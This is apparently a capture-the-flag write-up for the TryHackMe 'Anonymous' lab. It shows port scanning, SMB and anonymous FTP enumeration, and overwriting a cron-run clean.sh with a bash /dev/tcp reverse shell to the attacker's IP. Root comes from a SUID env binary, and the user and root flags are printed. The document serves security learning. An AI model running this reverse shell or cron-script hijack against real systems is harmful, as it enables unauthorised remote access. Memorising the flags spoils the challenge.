# Anonymous Write Up


## Step 1 : Port Scanning

Today I am going to solve TryHackMe VulnNet:Internal , so lets begin

First scan all the open ports in our machine ,

```
PORT    STATE SERVICE      REASON
21/tcp  open  ftp          syn-ack
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.4.67.68
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh          syn-ack
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDCi47ePYjDctfwgAphABwT1jpPkKajXoLvf3bb/zvpvDvXwWKnm6nZuzL2HA1veSQa90ydSSpg8S+B8SLpkFycv7iSy2/Jmf7qY+8oQxWThH1fwBMIO5g/TTtRRta6IPoKaMCle8hnp5pSP5D4saCpSW3E5rKd8qj3oAj6S8TWgE9cBNJbMRtVu1+sKjUy/7ymikcPGAjRSSaFDroF9fmGDQtd61oU5waKqurhZpre70UfOkZGWt6954rwbXthTeEjf+4J5+gIPDLcKzVO7BxkuJgTqk4lE9ZU/5INBXGpgI5r4mZknbEPJKS47XaOvkqm9QWveoOSQgkqdhIPjnhD
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPjHnAlR7sBuoSM2X5sATLllsFrcUNpTS87qXzhMD99aGGzyOlnWmjHGNmm34cWSzOohxhoK2fv9NWwcIQ5A/ng=
|   256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDHIuFL9AdcmaAIY7u+aJil1covB44FA632BSQ7sUqap
139/tcp open  netbios-ssn  syn-ack
445/tcp open  microsoft-ds syn-ack

Host script results:
|_clock-skew: mean: 0s, deviation: 1s, median: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 45858/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 40699/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 37880/udp): CLEAN (Failed to receive data)
|   Check 4 (port 23981/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   ANONYMOUS<00>        Flags: <unique><active>
|   ANONYMOUS<03>        Flags: <unique><active>
|   ANONYMOUS<20>        Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2022-06-18T14:21:43+00:00
| smb2-time: 
|   date: 2022-06-18T14:21:43
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 

```



Lets answer the first set of question from our scan report ,

*No. of Ports Open is 4 *

*Service running on port 21 *

*As we can see in script section smb in running on port 139 , 445*

## Step 2 : Enummerating Different Services On Machine

### SMB

Next question for us to find which directory and files are being share on smb server.

Lets try to view the services , by smbclient

```
smbclent -L 10.10.212.106
```



we can see pics dir is being shared on smbcleint 

lets connect to smb server to get more info

```
smbclent //10.10.212.106/pics 
```
without any password

![](https://i.imgur.com/pDlatDA.png)

Lets dig in smb server

```
└─$ smbclient //10.10.212.106/pics  
Password for [WORKGROUP\sage23]:
Try "help" to get a list of possible commands.
smb: \> ls 
  .                                   D        0  Sun May 17 16:41:34 2020
  ..                                  D        0  Thu May 14 07:29:10 2020
  corgo2.jpg                          N    42663  Tue May 12 06:13:42 2020
  puppos.jpeg                         N   265188  Tue May 12 06:13:42 2020

		20508240 blocks of size 1024. 13306808 blocks available
smb: \> get corgo2.jpg
getting file \corgo2.jpg of size 42663 as corgo2.jpg (15.5 KiloBytes/sec) (average 15.5 KiloBytes/sec)
smb: \> puppos.jpeg
puppos.jpeg: command not found
smb: \> get puppos.jpeg
getting file \puppos.jpeg of size 265188 as puppos.jpeg (71.7 KiloBytes/sec) (average 47.7 KiloBytes/sec)
smb: \> 

```
On opening files we can see their is only normal pics of dog and puppies

![](https://i.imgur.com/7Q4x9l4.jpg)




![](https://i.imgur.com/RzsmevQ.jpg)


### FTP 
  
Lets connect to ftp server in machine

```
ftp 10.10.212.106

```
```
──(sage23㉿kali)-[~/Desktop/THM/Anonymous]
└─$ ftp  10.10.212.106
Connected to 10.10.212.106.
220 NamelessOne's FTP Server!
Name (10.10.212.106:sage23): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||20151|)
150 Here comes the directory listing.
drwxr-xr-x    3 65534    65534        4096 May 13  2020 .
drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
226 Directory send OK.
ftp> 
```
lets go inside scripts

![](https://i.imgur.com/th0dtuf.png)

on opening all files we get 

to_do.txt

![](https://i.imgur.com/w5LPfAm.png)


remove_file.log

![](https://i.imgur.com/oPn1V36.png)


clean.sh

![](https://i.imgur.com/1YlBOwM.png)

on thinking we can deduce that a cron job is running on server that is running on server .

Lets replace *clean.sh* with our new clean.sh in which we will send a reverse shell from [pentesting monkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) and a [shell stabilizer](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/).

*reverse shell*
[](https://i.imgur.com/iBGQwcz.png)


*Shell stabilizer*
![](https://i.imgur.com/hwr2Dl9.png)


#### New *clean.sh*

![](https://i.imgur.com/KIwi1On.png)


```
#!/bin/bash

bash -i >& /dev/tcp/10.4.67.68/9005 0>&1


python -c 'import pty; pty.spawn("/bin/bash")'

```

now open *nc* for listing on port *9005*
```
nc -nvlp 9008
```

lets send it to ftp by ,

```
put clean.sh
```


![](https://i.imgur.com/SdnocYU.png)

we will get shell on our machine 

![](https://i.imgur.com/uBXNvLB.png)


## Step 3: User flag

just use normal cmd to get user.txt

![](https://i.imgur.com/AXjcXTL.png)

### flag : 90d6f992585815ff991e68748c414740


## Step 4: Root flag

lets find suid binaries for privillage escallation

```
find / -perm -u=s -type f 2>/dev/null
```

![](https://i.imgur.com/NMrTFV6.png)

we can see among all binary env is the one that usually doesn't have suid .

We can search for privillage escallation throught env by cheat sheet from [gtfobin](https://gtfobins.github.io/)

lets use
```
env /bin/sh -p
```

and just cat root.txt from root 

![](https://i.imgur.com/v4kFqJj.png)


### root.txt : 4d930091c31a622a7ed10f27999af363

#### Thanks to all who patiently read my Writup, 

#### In future , I will bring more writeup.


